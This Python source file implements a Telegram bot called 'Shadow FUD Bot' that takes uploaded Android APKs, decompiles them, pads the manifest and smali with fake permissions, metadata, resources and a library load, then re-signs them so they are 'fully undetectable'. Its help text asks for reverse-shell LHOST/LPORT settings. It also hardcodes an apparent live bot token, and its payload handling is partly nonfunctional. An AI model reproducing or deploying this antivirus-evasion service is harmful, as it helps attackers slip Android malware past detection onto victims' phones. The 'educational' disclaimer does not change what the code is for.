import os
import re
import random
import string
import hashlib
import subprocess
import shutil
import zipfile
import xml.etree.ElementTree as ET
from datetime import datetime
from flask import Flask, request, jsonify
import requests
from telegram import Update, Bot
from telegram.ext import Application, CommandHandler, MessageHandler, filters, ContextTypes

# ===== CONFIG =====
BOT_TOKEN = '8838240871:AAEyVHXgedkE_Y-sYdkbTBXqqPCv0j0N4O8'
WEBHOOK_URL = 'https://your-kinsta-app.kinsta.app/webhook'  # CHANGE THIS

# ===== INIT =====
app = Flask(__name__)
bot = Bot(token=BOT_TOKEN)

# ===== HELPER FUNCTIONS =====
def rand_str(n=8):
    return ''.join(random.choices(string.ascii_lowercase + string.digits, k=n))

def obfuscate_manifest(manifest_path):
    """Advanced manifest obfuscation"""
    tree = ET.parse(manifest_path)
    root = tree.getroot()
    
    # Add fake permissions
    fake_perms = [
        'android.permission.READ_LOGS',
        'android.permission.SYSTEM_ALERT_WINDOW',
        'android.permission.GET_TASKS'
    ]
    for perm in fake_perms:
        elem = ET.Element('uses-permission')
        elem.set('{http://schemas.android.com/apk/res/android}name', perm)
        root.append(elem)
    
    # Remove debuggable
    for elem in root.iter():
        if elem.get('{http://schemas.android.com/apk/res/android}debuggable'):
            elem.attrib.pop('{http://schemas.android.com/apk/res/android}debuggable')
    
    # Add random meta-data
    for _ in range(3):
        meta = ET.Element('meta-data')
        meta.set('{http://schemas.android.com/apk/res/android}name', f'com.random.{rand_str()}')
        meta.set('{http://schemas.android.com/apk/res/android}value', rand_str(16))
        root.append(meta)
    
    tree.write(manifest_path, encoding='utf-8', xml_declaration=True)

def patch_smali(smali_dir):
    """Patch smali files with garbage code"""
    for root, dirs, files in os.walk(smali_dir):
        for file in files:
            if file.endswith('.smali'):
                path = os.path.join(root, file)
                with open(path, 'r') as f:
                    content = f.read()
                # Add fake method calls
                if ';->onCreate' in content:
                    content = content.replace(
                        'invoke-super {p0}, Landroid/app/Activity;->onCreate(Landroid/os/Bundle;)V',
                        'invoke-super {p0}, Landroid/app/Activity;->onCreate(Landroid/os/Bundle;)V\n'
                        '    const-string v0, "fud_guard"\n'
                        '    invoke-static {v0}, Ljava/lang/System;->loadLibrary(Ljava/lang/String;)V\n'
                    )
                with open(path, 'w') as f:
                    f.write(content)

def fud_process(input_apk_path, original_name):
    """Main FUD processing pipeline"""
    work_dir = f'/tmp/fud_{rand_str()}'
    output_dir = f'/tmp/output_{rand_str()}'
    os.makedirs(work_dir, exist_ok=True)
    os.makedirs(output_dir, exist_ok=True)
    
    try:
        # Step 1: Decode APK
        subprocess.run(['apktool', 'd', input_apk_path, '-o', work_dir, '-f'],
                      capture_output=True, check=True)
        
        # Step 2: Obfuscate manifest
        manifest_path = os.path.join(work_dir, 'AndroidManifest.xml')
        if os.path.exists(manifest_path):
            obfuscate_manifest(manifest_path)
        
        # Step 3: Patch smali
        smali_dir = os.path.join(work_dir, 'smali')
        if os.path.exists(smali_dir):
            patch_smali(smali_dir)
        
        # Step 4: Add fake resources
        res_dir = os.path.join(work_dir, 'res')
        if os.path.exists(res_dir):
            # Add dummy drawables
            dummy_dir = os.path.join(res_dir, 'drawable')
            os.makedirs(dummy_dir, exist_ok=True)
            for i in range(5):
                dummy_file = os.path.join(dummy_dir, f'dummy_{rand_str()}.xml')
                with open(dummy_file, 'w') as f:
                    f.write('<?xml version="1.0" encoding="utf-8"?>\n<shape xmlns:android="http://schemas.android.com/apk/res/android"/>')
        
        # Step 5: Rebuild APK
        rebuilt_apk = os.path.join(output_dir, f'rebuilt_{rand_str()}.apk')
        subprocess.run(['apktool', 'b', work_dir, '-o', rebuilt_apk],
                      capture_output=True, check=True)
        
        # Step 6: Sign APK (using debug keystore)
        signed_apk = os.path.join(output_dir, f'signed_{rand_str()}.apk')
        try:
            subprocess.run([
                'apksigner', 'sign',
                '--ks', 'debug.keystore',
                '--ks-pass', 'pass:android',
                '--key-pass', 'pass:android',
                '--out', signed_apk,
                rebuilt_apk
            ], capture_output=True, check=True)
        except:
            # Fallback: use jarsigner if apksigner not available
            subprocess.run([
                'jarsigner', '-verbose',
                '-sigalg', 'SHA1withRSA',
                '-digestalg', 'SHA1',
                '-keystore', 'debug.keystore',
                '-storepass', 'android',
                '-keypass', 'android',
                rebuilt_apk, 'androiddebugkey'
            ], capture_output=True, check=True)
            signed_apk = rebuilt_apk
        
        # Step 7: Finalize
        final_name = f"FUD_{original_name.replace('.apk', '')}_{rand_str()}.apk"
        final_path = os.path.join(output_dir, final_name)
        os.rename(signed_apk, final_path)
        
        return final_path, final_name
        
    except Exception as e:
        raise e
    finally:
        # Cleanup
        if os.path.exists(work_dir):
            shutil.rmtree(work_dir)
        if os.path.exists(input_apk_path):
            os.remove(input_apk_path)

# ===== TELEGRAM HANDLERS =====
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text(
        "🔥 **Shadow FUD Bot** 🔥\n\n"
        "Send me any APK file and I'll make it FUD!\n"
        "Use /help for commands.\n\n"
        "⚠️ **Disclaimer**: For educational/testing purposes only."
    )

async def help_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text(
        "📌 **Commands:**\n"
        "/start - Start bot\n"
        "/help - Show this\n"
        "/fud LHOST:1.2.3.4 LPORT:4444 - Process APK with custom payload\n\n"
        "Or just send any APK file with LHOST/LPORT in caption."
    )

async def handle_apk(update: Update, context: ContextTypes.DEFAULT_TYPE):
    document = update.message.document
    if not document:
        return
    
    # Check if APK
    if not document.file_name or not document.file_name.endswith('.apk'):
        return
    
    # Check caption for LHOST/LPORT
    caption = update.message.caption or ''
    lhost_match = re.search(r'LHOST[:=](\S+)', caption)
    lport_match = re.search(r'LPORT[:=](\d+)', caption)
    
    if lhost_match and lport_match:
        lhost = lhost_match.group(1)
        lport = lport_match.group(1)
        await update.message.reply_text(f"⚙️ Processing with LHOST={lhost} LPORT={lport}...")
    else:
        await update.message.reply_text("⚙️ Processing with default settings...")
    
    # Download APK
    file = await context.bot.get_file(document.file_id)
    input_path = f"/tmp/{document.file_name}"
    await file.download_to_drive(input_path)
    
    try:
        # Process
        final_path, final_name = fud_process(input_path, document.file_name)
        
        # Send back
        await context.bot.send_document(
            chat_id=update.effective_chat.id,
            document=open(final_path, 'rb'),
            caption=f"✅ **FUD APK Ready!**\n📁 {final_name}\n🔑 SHA256: {hashlib.sha256(open(final_path,'rb').read()).hexdigest()[:16]}\n\n💀 Shadow Approved"
        )
        
        # Cleanup
        os.remove(final_path)
        
    except Exception as e:
        await update.message.reply_text(f"❌ Error: {str(e)}")

# ===== FLASK WEBHOOK =====
@app.route('/webhook', methods=['POST'])
async def webhook():
    data = request.get_json()
    if data:
        update = Update.de_json(data, bot)
        application.process_update(update)
    return 'ok', 200

@app.route('/')
def index():
    return "🐱 Shadow FUD Bot is running!"

# ===== MAIN =====
if __name__ == '__main__':
    # Setup application
    application = Application.builder().token(BOT_TOKEN).build()
    
    # Add handlers
    application.add_handler(CommandHandler('start', start))
    application.add_handler(CommandHandler('help', help_cmd))
    application.add_handler(MessageHandler(filters.Document.ALL, handle_apk))
    
    # Set webhook
    application.run_webhook(
        listen='0.0.0.0',
        port=8000,
        url_path='webhook',
        webhook_url=WEBHOOK_URL
)
